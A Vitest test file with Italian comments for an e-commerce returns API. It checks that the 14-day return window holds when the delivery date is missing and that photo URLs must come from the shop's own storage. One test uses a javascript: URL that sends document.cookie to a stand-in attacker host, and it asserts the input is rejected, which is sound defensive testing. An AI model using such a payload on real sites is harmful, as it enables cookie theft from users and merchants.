import { describe, it, expect, vi, beforeEach } from 'vitest';

/**
 * IL RESO HA SEMPRE UNA SCADENZA, E LE SUE FOTO STANNO IN CASA NOSTRA.
 *
 * 27/8/2026 (R128) — IL TERMINE DI 14 GIORNI SALTAVA DEL TUTTO SENZA LA DATA DI
 * CONSEGNA. Il conto stava dentro `if (order.delivered_at)`: colonna vuota,
 * blocco non eseguito, reso aperto senza nessun limite di tempo. Oggi il caso
 * non si raggiunge, perché tutte le strade verso DELIVERED scrivono anche la
 * data — ma è una difesa che, quando si rompe, si rompe nel verso sbagliato:
 * lascia passare invece di rifiutare. E la stessa colonna governa anche
 * l'ammissibilità dei bonifici, quindi il giorno in cui una strada nuova chiude
 * un ordine senza scriverla si aprono due difetti insieme: resi accettati a
 * mesi di distanza e negozi mai pagati.
 *
 * 27/8/2026 (R021) — LE FOTO DEL RESO ACCETTAVANO QUALUNQUE INDIRIZZO. Il
 * controllo era `z.array(z.string().url())`, e con zod 3 quello accetta anche
 * `javascript:` e `data:`. Il valore finisce dentro un `<a href>` nella scheda
 * che il negoziante apre per decidere il reso. Oggi la politica di sicurezza
 * dei contenuti spegne il danno peggiore; il nocciolo resta, ed è il domani:
 * se quella politica si allenta, lo stesso campo diventa esecuzione di codice.
 */

/** L'archivio di casa: senza questa variabile `fotoDiCasa` non sa qual e' il
 *  nostro host e puo' solo pretendere `https`. In produzione c'e' sempre. */
process.env.NEXT_PUBLIC_SUPABASE_URL = 'https://xyz.supabase.co';
const ARCHIVIO = 'xyz.supabase.co';

const CLIENTE = { id: 'b1' };

const stato: {
  ordine: Record<string, unknown>;
  resoCreato: Record<string, unknown> | null;
} = {
  ordine: {
    id: 'o1',
    user_id: 'b1',
    seller_id: 's1',
    delivery_status: 'DELIVERED',
    delivered_at: new Date().toISOString(),
    total_price: 30,
    created_at: new Date().toISOString(),
  },
  resoCreato: null,
};

vi.mock('@/lib/api/middleware', () => ({
  withAuthRateLimit:
    (_opts: unknown, handler: (ctx: { user: typeof CLIENTE; req: Request }) => unknown) =>
    (req: Request) => handler({ user: CLIENTE, req }),
}));
vi.mock('@/lib/logger', () => ({ logger: { error: vi.fn(), warn: vi.fn(), info: vi.fn(), spesa: vi.fn() } }));

vi.mock('@/lib/supabase/server', () => ({
  getServerSupabase: async () => ({
    from: (tabella: string) => {
      if (tabella === 'orders') {
        return { select: () => ({ eq: () => ({ single: async () => ({ data: stato.ordine, error: null }) }) }) };
      }
      // returns: nessun reso già aperto
      return {
        select: () => ({
          eq: () => ({ in: () => ({ limit: () => ({ maybeSingle: async () => ({ data: null }) }) }) }),
        }),
      };
    },
  }),
  getAdminSupabase: () => ({
    from: (tabella: string) => ({
      insert: (riga: Record<string, unknown>) => {
        // Solo la riga del reso: subito dopo passa di qui anche la notifica al
        // negoziante, e sovrascriverebbe quello che stiamo guardando.
        if (tabella === 'returns') stato.resoCreato = riga;
        return { select: () => ({ single: async () => ({ data: { id: 'r1' }, error: null }) }) };
      },
    }),
  }),
}));

import { POST } from '@/app/api/returns/create/route';

function apriReso(corpo: Record<string, unknown>) {
  return POST(new Request('http://localhost/api/returns/create', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ orderId: '11111111-1111-1111-1111-111111111111', reason: 'DAMAGED', ...corpo }),
  }) as never);
}

const giorniFa = (n: number) => new Date(Date.now() - n * 86_400_000).toISOString();

beforeEach(() => {
  stato.ordine = {
    id: 'o1',
    user_id: 'b1',
    seller_id: 's1',
    delivery_status: 'DELIVERED',
    delivered_at: new Date().toISOString(),
    total_price: 30,
    created_at: new Date().toISOString(),
  };
  stato.resoCreato = null;
});

describe('il termine dei 14 giorni', () => {
  it('IL CASO CHE ROMPEVA — senza data di consegna il termine non sparisce', async () => {
    // Un ordine consegnato tre mesi fa, ma con la data di consegna vuota: prima
    // il blocco del recesso non veniva nemmeno eseguito e il reso passava.
    stato.ordine = { ...stato.ordine, delivered_at: null, created_at: giorniFa(90) };

    const res = await apriReso({});

    expect(res.status, 'reso aperto a tre mesi di distanza, senza nessun limite').toBe(400);
    expect(stato.resoCreato).toBeNull();
  });

  it('senza data di consegna ma dentro i 14 giorni il reso si apre lo stesso', async () => {
    // Si conta dalla data dell'ordine, che è sempre precedente alla consegna:
    // il cliente non perde mai giorni che gli spettano.
    stato.ordine = { ...stato.ordine, delivered_at: null, created_at: giorniFa(3) };

    const res = await apriReso({});

    expect(res.status).toBe(201);
  });

  it('con la data di consegna il conto resta quello di prima', async () => {
    stato.ordine = { ...stato.ordine, delivered_at: giorniFa(20), created_at: giorniFa(25) };
    expect((await apriReso({})).status).toBe(400);

    stato.ordine = { ...stato.ordine, delivered_at: giorniFa(2), created_at: giorniFa(5) };
    expect((await apriReso({})).status).toBe(201);
  });
});

describe('le foto allegate al reso', () => {
  it('IL CASO CHE ROMPEVA — un indirizzo javascript: non entra nel database', async () => {
    const res = await apriReso({ photoUrls: ['javascript:fetch("https://ladro.example/"+document.cookie)'] });

    expect(
      res.status,
      'l indirizzo scelto dall utente finisce in un href nella scheda che apre il negoziante',
    ).toBe(400);
    expect(stato.resoCreato).toBeNull();
  });

  it('IL CASO CHE ROMPEVA — una foto ospitata altrove non entra', async () => {
    const res = await apriReso({ photoUrls: ['https://sito-di-un-altro.example/finta-foto.png'] });
    expect(res.status).toBe(400);
  });

  it('una foto del nostro archivio entra', async () => {
    const res = await apriReso({ photoUrls: [`https://${ARCHIVIO}/storage/v1/object/public/returns/foto.jpg`] });

    expect(res.status).toBe(201);
    expect(stato.resoCreato?.photo_urls).toHaveLength(1);
  });
});
